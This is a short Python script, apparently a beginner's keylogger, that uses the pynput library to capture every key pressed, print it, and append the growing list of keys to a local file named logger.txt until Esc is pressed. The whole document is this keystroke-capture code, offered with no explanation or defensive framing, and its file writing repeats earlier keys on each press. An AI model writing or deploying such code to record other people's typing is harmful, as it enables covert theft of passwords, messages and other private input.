from pynput.keyboard import Key, Listener

key_pressed = []


def on_press(key):
    key_pressed.append(key)
    write_file(key_pressed)
    print(key)


def write_file(char):
    with open("logger.txt", "a") as f:
        for i in char:
            new_char = str(i).replace("'", "")
            f.write(new_char)
            f.write(",")


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
